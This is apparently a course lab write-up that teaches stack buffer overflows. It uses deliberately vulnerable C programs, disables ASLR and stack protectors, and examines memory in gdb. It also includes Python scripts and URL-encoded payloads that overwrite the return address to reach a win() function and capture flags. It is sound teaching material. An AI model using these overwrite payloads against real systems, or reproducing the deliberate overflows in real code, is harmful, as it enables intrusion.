---
title: Demonstrating Simple Buffer Overflow
author: 
categories: [Project]
tags: []
media_subpath: /assets/images/ED202/
image:
  path: room_pic.png
---

## Overview

Buffer overflows in C can arise due to manual memory management, unsafe functions, and lack of automatic bounds checking. Here is a demonstration of inputting excess characters in a pre-defined size buffer and viewing the memory to see the impact. We will write a simple exploit and attempt to disrupt the normal flow of the program to show we can redirect it to arbitrary code, in this case, the `win()` function


| Name            | Demonstrating Simple Buffer Overflow                                 		  |
| ------------    | ------------------------------------------------------------------------------------- |
| Difficulty:     | Easy                                                                                  |
| Tools:          | gdb                                                    				  |
| Topics:         | Debugging with gdb, Memory Examination, ASLR


## Exploiting a 32-Bit Program

The following C program creates a buffer of size 10 but we use the `fgets` function to store 50 characters

### Vulnerable C program

```c
#include <stdlib.h>
#include <stdio.h>

int test_pw() {
        char password[10];
        printf("Password address: %p\n", password);
        printf("Enter password: ");
        fgets(password, 50, stdin);
        return 1;
}

void win() {
        printf("You win!\n");
}

void main() {
        if (test_pw()) printf("Fail!\n");
        else win();
}
```
### Compiling the C program

```shell
$ sudo apt-get install xxd gcc-multilib -y
$ gcc -g -m32 -o pwd32 pwd.c
$ file pwd32
$ ./pwd32
$ 1
$ gcc -g -m32 -no-pie -o pwd32 pwd.c
# for compiling on Ubuntu Linux
# gcc -g -m32 -no-pie -fno-stack-protector -o pwd32 pwd.c
```

### Buffer overflow

```shell
$ ./pwd32
Password address: 0xfff0b756
Enter password: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
Segmentation fault
```

ASLR prevents buffer overflow by making the memory layout of a process unpredictable. The address changes each time we execute the program, which means ASLR is doing its job

```shell
$ ./pwd32
Password address: 0xffc75196
Enter password: 1
Fail!
$ ./pwd32
Password address: 0xffb5c1c6
Enter password: 2
Fail!
$ ./pwd32
Password address: 0xffa42d36
Enter password: 3
Fail!
```


### Disable ASLR

```shell
$ sudo su -
$ echo 0 > /proc/sys/kernel/randomize_va_space  # echo 1 to re-enable ASLR
$ exit
```

Now the address stays the same

```shell
$ ./pwd32
Password address: 0xffffd516
Enter password: 1
Fail!
$ ./pwd32
Password address: 0xffffd516
Enter password: 2
Fail!
$ ./pwd32
Password address: 0xffffd516
Enter password: 3
Fail!
```


### Debugging with gdb

```shell
$ gdb -q pwd32
Reading symbols from pwd32...
(gdb) list 1,13
1       #include <stdlib.h>
2       #include <stdio.h>
3
4       int test_pw() {
5               char password[10];
6               printf("Password address: %p\n", password);
7               printf("Enter password: ");
8               fgets(password, 50, stdin);
9               return 1;
10      }
11
12      void win() {
13              printf("You win!\n");
(gdb) break 9
Breakpoint 1 at 0x1201: file pwd.c, line 9.
(gdb) run
Starting program: /home/debian/pwd32
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Password address: 0xffffd4e6
Enter password: AAAAAAAAAA

Breakpoint 1, test_pw () at pwd.c:9
9               return 1;
```

Set a breakpoint at line 9 right after we attempt a password and before we return to the `main()` function so we can view the contents inside the registers at this point. The purpose is to get the `eip` so we can manipulate the `eip` and have the `test_pw()` function return to `win()` instead

### View the registers

```shell
(gdb) info registers
eax            0xffffd4e6          -11034
ecx            0x0                 0
edx            0xf7e1e9c4          -136189500
ebx            0x56558ff4          1448447988
esp            0xffffd4e0          0xffffd4e0
ebp            0xffffd4f8          0xffffd4f8
esi            0x56558ee8          1448447720
edi            0xf7ffcb80          -134231168
eip            0x56556201          0x56556201 <test_pw+84>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
```

### Examine memory

```shell
(gdb) x/12x $esp
0xffffd4e0:     0xf7fc14b0      0x414197cb      0x41414141      0x41414141
0xffffd4f0:     0xffff000a      0x56558ff4      0xffffd508      0x56556255
0xffffd500:     0xffffd520      0xf7e1cff4      0x00000000      0xf7c232d5
```
`x`: eXamine memory

`12x`: 12 words(4 bytes per word is default) in hex format

`$esp`: starting from `$esp`

`ebp`, the end of the stack frame, begins at address `0xffffd4f8` and contains `0xffffd508` and the word immediately following that is the `eip` containing the **saved return pointer**. When the function returns, the address `0x56556255` is placed into the `eip`


In 32-bit architecture, the `eip` is 4 bytes (32 bits). In In 64-bit architecture, the `rip` is 8 bytes (64 bits).


`0xffffd4f0` − `0xffffd4e0` = `0x10` 

In the above memory table, each row differs by 16 bytes even though `0x10` is 16 in decimal which is represented by 5 bits. In a computer memory context, addresses are typically byte-addressable, meaning each address corresponds to a single byte of memory. Therefore, if you have two addresses that differ by `0x10`, it means that there are 16 individual byte locations between those two addresses.

"byte-addressable" refers to a memory architecture where each byte (usually consisting of 8 bits) has a unique address. This means that the smallest unit of addressable memory is one byte, allowing the CPU to read or write data at the byte level.


### Buffer Overflow

```shell
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/debian/pwd32
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Password address: 0xffffd4e6
Enter password: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ

Breakpoint 1, test_pw () at pwd.c:9
9               return 1;

(gdb) x/12x $esp
0xffffd4e0:     0xf7fc14b0      0x414197cb      0x42424141      0x43434242
0xffffd4f0:     0x44444343      0x45454444      0x46464545      0x47474646
0xffffd500:     0x48484747      0x49494848      0x4a4a4949      0x000a4a4a
```

The `eip RET` value now contains `0x47474646`, the hex codes for FFGG. This shows we can direct `eip` to the memory address we want

```shell
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x47474646 in ?? ()
```

```shell
(gdb) info registers
eax            0x1                 1
ecx            0x0                 0
edx            0xf7e1e9c4          -136189500
ebx            0x45454444          1162167364
esp            0xffffd500          0xffffd500
ebp            0x46464545          0x46464545
esi            0x56558ee8          1448447720
edi            0xf7ffcb80          -134231168
eip            0x47474646          0x47474646
eflags         0x10282             [ SF IF RF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
```

![gdb32](buffer.png)

### Disassembly

```shell
(gdb) disassemble win
Dump of assembler code for function win:
   0x5655620b <+0>:     push   %ebp
   0x5655620c <+1>:     mov    %esp,%ebp
   0x5655620e <+3>:     push   %ebx
   0x5655620f <+4>:     sub    $0x4,%esp
   0x56556212 <+7>:     call   0x5655627d <__x86.get_pc_thunk.ax>
   0x56556217 <+12>:    add    $0x2ddd,%eax
   0x5655621c <+17>:    sub    $0xc,%esp
   0x5655621f <+20>:    lea    -0x1fc5(%eax),%edx
   0x56556225 <+26>:    push   %edx
   0x56556226 <+27>:    mov    %eax,%ebx
   0x56556228 <+29>:    call   0x56556060 <puts@plt>
   0x5655622d <+34>:    add    $0x10,%esp
   0x56556230 <+37>:    nop
   0x56556231 <+38>:    mov    -0x4(%ebp),%ebx
   0x56556234 <+41>:    leave
   0x56556235 <+42>:    ret
End of assembler dump.
```

Find the memory address of where the `win()` function starts so we can place that location in the `eip`. Here it is `0x5655620b`

### Exploit File

Create an exploit file to write the input we want into the buffer 

```shell
#!/usr/bin/python3

import sys

# 0x5655620b: address where win() function begins
# Intel uses little endian so we write the address from least significant to most significant byte

prefix = b"AAAABBBBCCCCDDDDEEEEFF"
eip = b'\x0b\x62\x55\x56'
postfix = b"GGHHHHIIIIJJJJ"

sys.stdout.buffer.write(prefix + eip + postfix)
```

Running the exploit file, the input displays as: 

```shell
$ ./exploit-pwd32
AAAABBBBCCCCDDDDEEEEFF
                      bUVGGHHHHIIIIJJJJ
```

### Hex dump 

```shell
$./exploit-pwd32 > attack-pwd32
$ xxd attack-pwd32
-rw-r--r-- 1 debian debian 40 Mar 13 22:15 attack-pwd32
00000000: 4141 4141 4242 4242 4343 4343 4444 4444  AAAABBBBCCCCDDDD
00000010: 4545 4545 4646 0b62 5556 4747 4848 4848  EEEEFF.bUVGGHHHH
00000020: 4949 4949 4a4a 4a4a                      IIIIJJJJ

```
Now run the `pwd32` program using the exploit file as input

```shell
$ gdb -q pwd32
Reading symbols from pwd32...
(gdb) break 9
Breakpoint 1 at 0x1201: file pwd.c, line 9.
(gdb) run --args < attack-pwd32
Starting program: /home/debian/pwd32 --args < attack-pwd32
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Password address: 0xffffd4d6

Breakpoint 1, test_pw () at pwd.c:9
9               return 1;
(gdb) info registers
eax            0xffffd4d6          -11050
ecx            0xffffd4fe          -11010
edx            0xf7e1e9c4          -136189500
ebx            0x56558ff4          1448447988
esp            0xffffd4d0          0xffffd4d0
ebp            0xffffd4e8          0xffffd4e8
esi            0x56558ee8          1448447720
edi            0xf7ffcb80          -134231168
eip            0x56556201          0x56556201 <test_pw+84>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/12x $esp
0xffffd4d0:     0xf7fc14b0      0x414197cb      0x42424141      0x43434242
0xffffd4e0:     0x44444343      0x45454444      0x46464545      0x5655620b
0xffffd4f0:     0x48484747      0x49494848      0x4a4a4949      0xf7004a4a
(gdb)
```

Step through to continue past the breakpoint and we have gotten to the `win()` function 

```shell
(gdb) continue
Continuing.
Enter password: You win!

Program received signal SIGSEGV, Segmentation fault.
0x48484747 in ?? ()
(gdb)
```

###  Running the Exploit Outside the Debugger

```shell
$ ./pwd32 < attack-pwd32
Password address: 0xffffd516
Enter password: You win!
Segmentation fault
```

## 64-bit Exploit

```shell
$ gcc -g -o pwd64 pwd.c
pwd.c: In function ‘test_pw’:
pwd.c:8:9: warning: ‘fgets’ writing 50 bytes into a region of size 10 overflows the destination [-Wstringop-overflow=]
```

A warning is displayed about a buffer overflow when compiling, which is what we want

Now we test some inputs and we get Fail! for an appropriate length, but wrong password and segmentation fault for an input that overflows the buffer

```shell
$ ./pwd64
Password address: 0x7fffffffe3d6
Enter password: 1
Fail!
$ ./pwd64
Password address: 0x7fffffffe3d6
Enter password: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
Segmentation fault
```


### Debugger

Testing to see how the program runs normally with an appropriate input `AAAAAAAAAA`:


```shell
$ gdb -q pwd64
Reading symbols from pwd64...
(gdb) list 1,13
1       #include <stdlib.h>
2       #include <stdio.h>
3
4       int test_pw() {
5               char password[10];
6               printf("Password address: %p\n", password);
7               printf("Enter password: ");
8               fgets(password, 50, stdin);
9               return 1;
10      }
11
12      void win() {
13              printf("You win!\n");
(gdb) break 9
Breakpoint 1 at 0x11a8: file pwd.c, line 9.
(gdb) run
Starting program: /home/debian/pwd64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Password address: 0x7fffffffe396
Enter password: AAAAAAAAAA

Breakpoint 1, test_pw () at pwd.c:9
9               return 1;
```

### Registers

```shell
(gdb) info registers
rax            0x7fffffffe396      140737488348054
rbx            0x7fffffffe4c8      140737488348360
rcx            0xa41414141414141   738943562388947265
rdx            0xfbad2288          4222427784
rsi            0x4141414141414141  4702111234474983745
rdi            0x7ffff7fafa20      140737353808416
rbp            0x7fffffffe3a0      0x7fffffffe3a0
rsp            0x7fffffffe390      0x7fffffffe390
r8             0x5555555596bb      93824992253627
r9             0x0                 0
r10            0x1000              4096
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffe4d8      140737488348376
r14            0x555555557dd8      93824992247256
r15            0x7ffff7ffd020      140737354125344
rip            0x5555555551a8      0x5555555551a8 <test_pw+79>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
```

### Memory Examination
```shell
(gdb) x/12gx $rsp
0x7fffffffe390: 0x4141000000000000      0x4141414141414141
0x7fffffffe3a0: 0x00007fffffff000a      0x00005555555551d3
0x7fffffffe3b0: 0x0000000000000001      0x00007ffff7e0224a
0x7fffffffe3c0: 0x00007fffffffe4b0      0x00005555555551c5
0x7fffffffe3d0: 0x0000000155554040      0x00007fffffffe4c8
0x7fffffffe3e0: 0x00007fffffffe4c8      0xc84d7419830e3fd3
```

`x/12gx`: use g for giant words to display 8 bytes (64 bits) at a time

On 64-bit systems, the `rip` is 8 bytes (64 bits) and immediately follows the end of the stack frame. Here, it is `0x00005555555551d3`

### Overflowing the Stack with 40 Characters

```shell
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/debian/pwd64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Password address: 0x7fffffffe396
Enter password: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ

Breakpoint 1, test_pw () at pwd.c:9
9               return 1;
(gdb) x/12gx $rsp
0x7fffffffe390: 0x4141000000000000      0x4343424242424141
0x7fffffffe3a0: 0x4545444444444343      0x4747464646464545
0x7fffffffe3b0: 0x4949484848484747      0x000a4a4a4a4a4949
0x7fffffffe3c0: 0x00007fffffffe4b0      0x00005555555551c5
0x7fffffffe3d0: 0x0000000155554040      0x00007fffffffe4c8
0x7fffffffe3e0: 0x00007fffffffe4c8      0x682bd9b1b51f3895
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00005555555551ae in test_pw () at pwd.c:10
10      }
```

![gdb64](buffer64.png)

Our input overflows the `rip`, resulting in a segmentation fault and the `RET` value now contains `0x4747464646464545`, hexadecimal codes for `EEFFFFGG` in little endian

### Disassembly

```shell
(gdb) disassemble win
Dump of assembler code for function win:
   0x00005555555551af <+0>:     push   %rbp
   0x00005555555551b0 <+1>:     mov    %rsp,%rbp
   0x00005555555551b3 <+4>:     lea    0xe71(%rip),%rax        # 0x55555555602b
   0x00005555555551ba <+11>:    mov    %rax,%rdi
   0x00005555555551bd <+14>:    call   0x555555555030 <puts@plt>
   0x00005555555551c2 <+19>:    nop
   0x00005555555551c3 <+20>:    pop    %rbp
   0x00005555555551c4 <+21>:    ret
End of assembler dump.
```

The `win()` function starts at `0x00005555555551af`

### Exploit file

```python
#!/usr/bin/python3

import sys

prefix = b"AAAABBBBCCCCDDDDEE"
eip = b'\xaf\x51\x55\x55\x55\x55\x00\x00'
postfix = b"GGHHHHIIIIJJJJ"

sys.stdout.buffer.write(prefix + eip + postfix)
```

The program prints out the letters, with eight letters in the middle changed, some of them unprintable

```bash
$ ./exploit-pwd64
AAAABBBBCCCCDDDDEE▒QUUUUGGHHHHIIIIJJJJ
```

Hexdump of the file shows the 40 character input with the memory address of the `win()` function substituted in the middle

```bash
$ ./exploit-pwd64 > attack-pwd64
$ xxd attack-pwd64
00000000: 4141 4141 4242 4242 4343 4343 4444 4444  AAAABBBBCCCCDDDD
00000010: 4545 af51 5555 5555 0000 4747 4848 4848  EE.QUUUU..GGHHHH
00000020: 4949 4949 4a4a 4a4a                      IIIIJJJJ
```

## Testing the Exploit in the Debugger

```bash
$ gdb -q pwd64
Reading symbols from pwd64...
(gdb) break 9
Breakpoint 1 at 0x11a8: file pwd.c, line 9.
(gdb) break 14
Breakpoint 2 at 0x11c2: file pwd.c, line 14.
(gdb) run --args < attack-pwd64
Starting program: /home/debian/pwd64 --args < attack-pwd64
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Password address: 0x7fffffffe396

Breakpoint 1, test_pw () at pwd.c:9
9               return 1;
```

```bash
(gdb) info registers
rax            0x7fffffffe396      140737488348054
rbx            0x7fffffffe4c8      140737488348360
rcx            0x7fffffffe396      140737488348054
rdx            0xfbad2098          4222427288
rsi            0x5555555596b0      93824992253616
rdi            0x7ffff7fafa20      140737353808416
rbp            0x7fffffffe3a0      0x7fffffffe3a0
rsp            0x7fffffffe390      0x7fffffffe390
r8             0x0                 0
r9             0x0                 0
r10            0x1000              4096
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffe4e0      140737488348384
r14            0x555555557dd8      93824992247256
r15            0x7ffff7ffd020      140737354125344
rip            0x5555555551a8      0x5555555551a8 <test_pw+79>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
```

Examining the memory shows the the address of the `win()` function `0x00005555555551af` is now the `RET` value

```bash
(gdb) x/12gx $rsp
0x7fffffffe390: 0x4141000000000000      0x4343424242424141
0x7fffffffe3a0: 0x4545444444444343      0x00005555555551af
0x7fffffffe3b0: 0x4949484848484747      0x00004a4a4a4a4949
0x7fffffffe3c0: 0x00007fffffffe4b0      0x00005555555551c5
0x7fffffffe3d0: 0x0000000255554040      0x00007fffffffe4c8
0x7fffffffe3e0: 0x00007fffffffe4c8      0x1a119f3178cc5d2c
```

```bash
(gdb) continue
Continuing.
Enter password: You win!

Breakpoint 2, win () at pwd.c:14
14      }
```

### Running the Exploit Outside the Debugger

```bash
~$ ./pwd64 < attack-pwd64
Password address: 0x7fffffffe3d6
Enter password: You win!
Segmentation fault
```

## 202.5 & 202.6: Exploiting a Remote 32-bit Server

The `main()` function creates an array of size 100 and uses `gets` to read and store the user input. This is the first potential buffer overflow.

The `activate()` function takes a pointer to the character array that stored the user input. Another potential buffer overflow is seen as a local array of size 25 is created and string copies the user input to it.


```bash
(gdb) list 1,33
1	#include 
2	#include 
3	#include 
4	
5	int activate(char *str) {
6	    char key[25];
7	    strcpy(key, str);
8	
9	    if (key[30] == 7) {
10	        printf("Congratulations!  The first flag is XXXXXXXXXXXXXXXXX\n");
11	        fflush( stdout );
12	    }
13	    return 1;
14	}
15	
16	void win() {
17	    printf("Congratulations!  The second flag is XXXXXXXXXXXXXXX\n");
18	    fflush( stdout );
19	}
20	
21	void main() {
22	    char key[100];
23	    printf("Enter product key: ");
24	    gets(key);
25	    if (activate(key)) printf("\nOh no! You may be the victim of software piracy!\n");
26		else win();
27	}
```

Testing under normal conditons with a 29 characters where 30th character is null terminator. When you create a character array intended to hold a string, you must ensure that the last element is reserved for the null terminator. For example, if you want to store a string of up to 5 characters, you should declare the array with a size of 6

```bash
(gdb) break 8
Breakpoint 1 at 0x6a4: file ED202.5b.c, line 8.
(gdb) run < input-string
Breakpoint 1, activate (str=0xffffdc6c "ABCDEFGHIJKLMNOPQRSTUVWXYZABC") at ED202.5b.c:9
9	    if (key[30] == 7) {

(gdb) info registers
eax            0xffffdc27	-9177
ecx            0xffffdc6c	-9108
edx            0xffffdc27	-9177
ebx            0x56557000	1448439808
esp            0xffffdc20	0xffffdc20
ebp            0xffffdc48	0xffffdc48
esi            0xf7fbd000	-134492160
edi            0xf7fbd000	-134492160
eip            0x565556a4	0x565556a4 
eflags         0x282	[ SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99

(gdb) x/40x $esp
0xffffdc20:	0xf7fe77eb	0x41557000	0x45444342	0xffffdc00
0xffffdc30:	0xffffdcd8	0xf7fee010	0xf7e693fb	0x56557000
0xffffdc40:	0xf7fbd000	0x56557000	0xffffdcd8	0x56555764
0xffffdc50:	0xffffdc6c	0x00000001	0x000000bf	0x56555731
0xffffdc60:	0xffffdc8e	0xffffdd8c	0x000000e0	0x44434241
0xffffdc70:	0xf7ff0045	0xf7ffd918	0xffffdc90	0x5655530f
0xffffdc80:	0x00000000	0xffffdd24	0xf7fbd000	0x00001037
0xffffdc90:	0xffffffff	0x0000002f	0xf7e16dc8	0xf7fd71b0
0xffffdca0:	0x00008000	0xf7fbd000	0x00000000	0xf7e2233a
0xffffdcb0:	0x00000001	0x56557000	0x00000001	0x565557db

(gdb) continue
Enter product key: 
Oh no! You may be the victim of software piracy!
[Inferior 1 (process 14824) exited with code 062]
```

Testing with 30 characters where 31st character is the null terminator, we get a segmentation fault

```bash
(gdb) run < input-string
Breakpoint 1, activate (str=0xffffdc6c "ABCDEFGHIJKLMNOPQRSTUVWXYZABCD") at ED202.5b.c:9
9	    if (key[30] == 7) {
(gdb) x/40x $esp
0xffffdc20:	0xf7fe77eb	0x41557000	0x45444342	0x49484746
0xffffdc30:	0x4d4c4b4a	0x51504f4e	0x55545352	0x59585756
0xffffdc40:	0x4342415a	0x56550044	0xffffdcd8	0x56555764
0xffffdc50:	0xffffdc6c	0x00000001	0x000000bf	0x56555731
0xffffdc60:	0xffffdc8e	0xffffdd8c	0x000000e0	0x44434241
0xffffdc70:	0x48474645	0x4c4b4a49	0x504f4e4d	0x54535251
0xffffdc80:	0x58575655	0x42415a59	0xf7004443	0x00001037
0xffffdc90:	0xffffffff	0x0000002f	0xf7e16dc8	0xf7fd71b0
0xffffdca0:	0x00008000	0xf7fbd000	0x00000000	0xf7e2233a
0xffffdcb0:	0x00000001	0x56557000	0x00000001	0x565557db
(gdb) continue
Program received signal SIGSEGV, Segmentation fault.
0x565554e0 in puts@plt ()
A debugging session is active.

	Inferior 1 [process 22549] will be killed.

Quit anyway? (y or n) [answered Y; input not from terminal]
```

### First flag

The first flag is obtained if the input is an array of 31 characters where `key[30]` is a BEL (ASCII code 7). Send input string `ABCDEFGHIJKLMNOPQRSTUVWXYZABCD%07` to URL encode the BEL character

```
(gdb) run < input-string
Breakpoint 1, activate (str=0xffffdc6c "ABCDEFGHIJKLMNOPQRSTUVWXYZABCD\a") at ED202.5b.c:9
9	    if (key[30] == 7) {
(gdb) x/40x $esp
0xffffdc20:	0xf7fe77eb	0x41557000	0x45444342	0x49484746
0xffffdc30:	0x4d4c4b4a	0x51504f4e	0x55545352	0x59585756
0xffffdc40:	0x4342415a	0x56000744	0xffffdcd8	0x56555764
0xffffdc50:	0xffffdc6c	0x00000001	0x000000bf	0x56555731
0xffffdc60:	0xffffdc8e	0xffffdd8c	0x000000e0	0x44434241
0xffffdc70:	0x48474645	0x4c4b4a49	0x504f4e4d	0x54535251
0xffffdc80:	0x58575655	0x42415a59	0x00074443	0x00001037
0xffffdc90:	0xffffffff	0x0000002f	0xf7e16dc8	0xf7fd71b0
0xffffdca0:	0x00008000	0xf7fbd000	0x00000000	0xf7e2233a
0xffffdcb0:	0x00000001	0x56557000	0x00000001	0x565557db
(gdb) continue
Enter product key: Congratulations!  The first flag is SPECIAL-CHARACTER

Program received signal SIGSEGV, Segmentation fault.
0x565554e0 in puts@plt ()
A debugging session is active.

	Inferior 1 [process 25501] will be killed.

Quit anyway? (y or n) [answered Y; input not from terminal]
```

### win() function

The memory address of the `win()` function is at `0x565556dc`

```bash
(gdb) disassemble /s win,+1
Dump of assembler code from 0x565556dc to 0x565556dd:
ED202.5b.c:
16	void win() {
   0x565556dc :	push   %ebp
End of assembler dump.
```

We pad the array with 37 letters to the end of the `ebp` and send the string `ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJK%dc%56%55%56` to URL encode the `win()` memory address in little endian and store that in the `eip`

```bash
(gdb) run < input-string
Breakpoint 1, activate (str=0xffffdc00 "'\334\377\377") at ED202.5b.c:9
9	    if (key[30] == 7) {
(gdb) x/40x $esp
0xffffdc20:	0xf7fe77eb	0x41557000	0x45444342	0x49484746
0xffffdc30:	0x4d4c4b4a	0x51504f4e	0x55545352	0x59585756
0xffffdc40:	0x4342415a	0x47464544	0x4b4a4948	0x565556dc
0xffffdc50:	0xffffdc00	0x00000001	0x000000bf	0x56555731
0xffffdc60:	0xffffdc8e	0xffffdd8c	0x000000e0	0x44434241
0xffffdc70:	0x48474645	0x4c4b4a49	0x504f4e4d	0x54535251
0xffffdc80:	0x58575655	0x42415a59	0x46454443	0x4a494847
0xffffdc90:	0x5556dc4b	0x00000056	0xf7e16dc8	0xf7fd71b0
0xffffdca0:	0x00008000	0xf7fbd000	0x00000000	0xf7e2233a
0xffffdcb0:	0x00000001	0x56557000	0x00000001	0x565557db
(gdb) continue
Enter product key: Congratulations!  The second flag is RETURN-ORIENTED

Program received signal SIGSEGV, Segmentation fault.
0xffffdc00 in ?? ()
A debugging session is active.

	Inferior 1 [process 30409] will be killed.

Quit anyway? (y or n) [answered Y; input not from terminal]
```

## 202.7 Exploiting a Remote 64-bit Server

```bash
(gdb) list 1,33
1	#include 
2	#include 
3	#include 
4	
5	int activate(char *str) {
6	    char key[25];
7	    strcpy(key, str);
8	    return 1;
9	}
10	
11	void win() {
12	    printf("Congratulations!  The flag is XXXXXXXXXXXX\n");
13	    fflush( stdout );
14	}
15	
16	void main() {
17	    char key[100];
18	    printf("Enter product key: ");
19	    gets(key);
20	    if (activate(key)) printf("\nOh no! You may be the victim of software piracy!\n");
21		else win();
22	}

(gdb) break 8
Breakpoint 1 at 0x82f: file ED202.7.c, line 8.
(gdb) run < input-string
Breakpoint 1, activate (str=0x7fffffffeb70 "ABCDEFGHIJKLMNOPQRSTUVWXYZ") at ED202.7.c:8
8	    return 1;
(gdb) disassemble /s win,+1
Dump of assembler code from 0x555555554836 to 0x555555554837:
ED202.7.c:
11	void win() {
   0x0000555555554836 :	push   %rbp
End of assembler dump.
```

```bash
(gdb) info registers
rax            0x7fffffffeb40	140737488350016
rbx            0x0	0
rcx            0x5a5958	5921112
rdx            0x5857565554535251	6365651522798441041
rsi            0x7fffffffeb70	140737488350064
rdi            0x7fffffffeb40	140737488350016
rbp            0x7fffffffeb60	0x7fffffffeb60
rsp            0x7fffffffeb30	0x7fffffffeb30
r8             0x55555575703b	93824994340923
r9             0x0	0
r10            0x5d	93
r11            0x7ffff7b94e08	140737349504520
r12            0x5555555546e0	93824992233184
r13            0x7fffffffecc0	140737488350400
r14            0x0	0
r15            0x0	0
rip            0x55555555482f	0x55555555482f 
eflags         0x202	[ IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```

```bash
(gdb) x/40gx $rsp
0x7fffffffeb30:	0x00007fffffffecc0	0x00007fffffffeb70
0x7fffffffeb40:	0x4847464544434241	0x504f4e4d4c4b4a49
0x7fffffffeb50:	0x5857565554535251	0x00007fffff005a59
0x7fffffffeb60:	0x00007fffffffebe0	0x000055555555488e
0x7fffffffeb70:	0x4847464544434241	0x504f4e4d4c4b4a49
0x7fffffffeb80:	0x5857565554535251	0x00007fffff005a59
0x7fffffffeb90:	0x00007ffff7ffe168	0x0000000000000000
0x7fffffffeba0:	0x0000000000000001	0x00005555555548fd
0x7fffffffebb0:	0x00007fffffffebde	0x0000000000000000
0x7fffffffebc0:	0x00005555555548b0	0x00005555555546e0
0x7fffffffebd0:	0x00007fffffffecc0	0x0000000000000000
0x7fffffffebe0:	0x00005555555548b0	0x00007ffff7a2d840
0x7fffffffebf0:	0x0000000000000000	0x00007fffffffecc8
0x7fffffffec00:	0x00000001f7ffcca0	0x0000555555554858
0x7fffffffec10:	0x0000000000000000	0x0f60b8fd027b15fd
0x7fffffffec20:	0x00005555555546e0	0x00007fffffffecc0
0x7fffffffec30:	0x0000000000000000	0x0000000000000000
0x7fffffffec40:	0x5a35eda844fb15fd	0x5a35fd123ceb15fd
0x7fffffffec50:	0x0000000000000000	0x0000000000000000
0x7fffffffec60:	0x0000000000000000	0x00007fffffffecd8
```


```bash
(gdb) continue
Enter product key: 
Oh no! You may be the victim of software piracy!
[Inferior 1 (process 25355) exited with code 062]
```

`rbp` is at `0x7fffffffeb60` 

`rip RET` value is currently `0x000055555555488e`

`win()` function is at `0x0000555555554836`

Padding with 40 characters, send the input `ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMN%36%48%55%55%55%55`

### Buffer overflow

```bash
(gdb) run < input-string
Breakpoint 1, activate (str=0x7fffffffeb70 "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMN6HUUUU") at ED202.7.c:8
8	    return 1;
```

```bash
(gdb) x/40gx $rsp
0x7fffffffeb30:	0x00007fffffffecc0	0x00007fffffffeb70
0x7fffffffeb40:	0x4847464544434241	0x504f4e4d4c4b4a49
0x7fffffffeb50:	0x5857565554535251	0x4645444342415a59
0x7fffffffeb60:	0x4e4d4c4b4a494847	0x0000555555554836
0x7fffffffeb70:	0x4847464544434241	0x504f4e4d4c4b4a49
0x7fffffffeb80:	0x5857565554535251	0x4645444342415a59
0x7fffffffeb90:	0x4e4d4c4b4a494847	0x0000555555554836
0x7fffffffeba0:	0x0000000000000001	0x00005555555548fd
0x7fffffffebb0:	0x00007fffffffebde	0x0000000000000000
0x7fffffffebc0:	0x00005555555548b0	0x00005555555546e0
0x7fffffffebd0:	0x00007fffffffecc0	0x0000000000000000
0x7fffffffebe0:	0x00005555555548b0	0x00007ffff7a2d840
0x7fffffffebf0:	0x0000000000000000	0x00007fffffffecc8
0x7fffffffec00:	0x00000001f7ffcca0	0x0000555555554858
0x7fffffffec10:	0x0000000000000000	0x7047d5b41481e347
0x7fffffffec20:	0x00005555555546e0	0x00007fffffffecc0
0x7fffffffec30:	0x0000000000000000	0x0000000000000000
0x7fffffffec40:	0x251280e15201e347	0x2512905b2a11e347
0x7fffffffec50:	0x0000000000000000	0x0000000000000000
0x7fffffffec60:	0x0000000000000000	0x00007fffffffecd8

(gdb) continue
Enter product key: Congratulations!  The flag is 8-BYTES-LONG

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554857 in win () at ED202.7.c:14
14	}
A debugging session is active.

	Inferior 1 [process 32040] will be killed.

Quit anyway? (y or n) [answered Y; input not from terminal]
```

## 202.8 & 202.9: Exploiting a 32-Bit Server with ASLR

```bash
(gdb) list 6,16
6	int activate(char *str) {
7	    char key[25];
8	    strcpy(key, str);
9	    return 1;
10	}
11	
12	void win() {
13	    printf("\nCongratulations!  The first flag is XXXXXXXXXXXXXXX\n");
14	    fflush( stdout );
